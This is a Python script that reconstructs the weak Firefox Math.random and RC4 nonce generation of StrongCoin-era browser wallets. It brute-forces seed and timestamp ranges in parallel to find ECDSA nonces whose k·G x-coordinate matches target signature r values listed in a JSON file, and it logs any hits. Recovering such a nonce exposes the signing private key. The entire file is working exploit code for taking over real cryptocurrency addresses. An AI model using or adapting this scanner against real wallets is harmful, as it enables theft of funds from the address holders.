#!/usr/bin/env python3
"""
Firefox PRNG k-recovery scanner (StrongCoin era).

Usage:
    python scanner.py                # full scan (tar_addresses.json)
    python scanner.py --test         # small-range sanity check
    python scanner.py --debug        # print k values for inspection
"""
import argparse
import json
import multiprocessing as mp
import os
import sys
import time

from coincurve import PublicKey

# ---------- secp256k1 constants ----------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
M48 = (1 << 48) - 1


# ---------- Firefox PRNG (SpiderMonkey, Java-style 48-bit LCG) ----------
def firefox_random16(base_seed, pending, n):
    seed = (base_seed << 8) ^ 1
    state = (seed ^ 0x5DEECE66D) & M48
    out = []
    for idx in range(n + pending):
        state = (state * 0x5DEECE66D + 0xB) & M48
        hi = state >> 22
        state = (state * 0x5DEECE66D + 0xB) & M48
        lo = state >> 21
        numerator = (hi << 27) + lo
        if idx >= pending:
            out.append((numerator * 65536) >> 53)
    return out


# ---------- RC4 ----------
def rc4_init(key):
    S = list(range(256))
    j = 0
    klen = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % klen]) & 255
        S[i], S[j] = S[j], S[i]
    return S, 0, 0


def rc4_next(S, i, j):
    i = (i + 1) & 255
    j = (j + S[i]) & 255
    S[i], S[j] = S[j], S[i]
    return S[(S[i] + S[j]) & 255], i, j


# ---------- k pipeline ----------
def k_from(seed_value, t1, t2, pending=0):
    draws = firefox_random16(seed_value, pending, 128)
    pool = bytearray(256)
    for i, t in enumerate(draws):
        pool[2 * i] = (t >> 8) & 255
        pool[2 * i + 1] = t & 255

    for shift, base in ((0, t1), (4, t2)):
        xi = base & 0xFFFFFFFF
        pool[shift]     ^= xi & 255
        pool[shift + 1] ^= (xi >> 8) & 255
        pool[shift + 2] ^= (xi >> 16) & 255
        pool[shift + 3] ^= (xi >> 24) & 255

    S, i, j = rc4_init(pool)
    _, i, j = rc4_next(S, i, j)  # discard first byte (xb[0] = 0)
    v = 0
    for _ in range(32):
        b, i, j = rc4_next(S, i, j)
        v = (v << 8) | b
    return v % (N - 1) + 1


# ---------- coincurve: x-coordinate of k*G ----------
def mul_x_coincurve(k):
    """Return affine x-coordinate of k*G using coincurve high-level API."""
    if k <= 0 or k >= N:
        return None
    try:
        pk = PublicKey.from_valid_secret(k.to_bytes(32, "big"))
        # compressed format: 33 bytes, first byte 02/03, then 32-byte x
        return int.from_bytes(pk.format(compressed=True)[1:], "big")
    except Exception:
        return None


# ---------- worker ----------
def scan_range(args):
    label, lo, hi, seed_max, size_t1, size_t2, target_set, debug = args
    checked = 0
    t_start = time.time()
    for start_time in range(lo, hi):
        base_ms = start_time * 1000
        for seed_temp in range(seed_max):
            seed = base_ms + seed_temp
            for temp_t1 in range(size_t1):
                t1 = start_time + temp_t1
                for temp_t2 in range(size_t2):
                    k = k_from(seed, t1, t1 + temp_t2, 0)
                    r = mul_x_coincurve(k)
                    checked += 1
                    if debug and checked <= 5:
                        print(
                            f"[debug] seed={seed} t1={t1} t2={t1+temp_t2} "
                            f"k={k} r={r}",
                            flush=True,
                        )
                    if r is not None and r in target_set:
                        return (label, k, r, checked)
    elapsed = time.time() - t_start
    rate = checked / elapsed if elapsed > 0 else 0
    print(
        f"[worker] {lo}~{hi} done: {checked} iters in {elapsed:.1f}s "
        f"({rate:.0f} iter/s)",
        flush=True,
    )
    return (label, None, None, checked)


# ---------- main ----------
def main(label, end_t1, target_list, test=False, debug=False):
    temp_ms = 60 if test else 15 * 60 * 1000
    size_t1 = 5 if test else 400
    size_t2 = 3 if test else 30
    seed_max = 10 if test else 1000

    target_set = set(target_list)
    lo = end_t1 - temp_ms
    hi = end_t1

    total_iters = (hi - lo) * seed_max * size_t1 * size_t2
    print(
        f"[main] label={label} range={lo}~{hi} iters={total_iters:,}",
        flush=True,
    )

    num_procs = max(1, mp.cpu_count())
    chunk = max(1, (hi - lo) // (num_procs * 4))
    ranges = []
    s = lo
    while s < hi:
        e = min(s + chunk, hi)
        ranges.append(
            (label, s, e, seed_max, size_t1, size_t2, target_set, debug)
        )
        s = e

    t_start = time.time()
    with mp.Pool(num_procs) as pool:
        for lbl, k, r, checked in pool.imap_unordered(scan_range, ranges):
            if k is not None:
                elapsed = time.time() - t_start
                print(
                    f"[main] SUCCESS label={lbl} k={k} r={r} "
                    f"checked={checked:,} in {elapsed:.1f}s",
                    flush=True,
                )
                pool.terminate()
                return lbl, k
    elapsed = time.time() - t_start
    print(f"[main] NOT FOUND label={label} in {elapsed:.1f}s", flush=True)
    return label, 0


def load_json_data(path="tar_addresses.json"):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--test", action="store_true", help="small-range sanity check")
    ap.add_argument("--debug", action="store_true", help="print first k values per worker")
    ap.add_argument("--data", default="tar_addresses.json")
    args = ap.parse_args()

    data = load_json_data(args.data)
    print(f"[main] loaded {len(data)} labels from {args.data}", flush=True)

    with open("results.txt", "a", encoding="utf-8") as f:
        for entry in data:
            label, k = main(
                entry["label"],
                entry["time"],
                entry["target"],
                test=args.test,
                debug=args.debug,
            )
            f.write(f"{label}\t{k}\n")
            f.flush()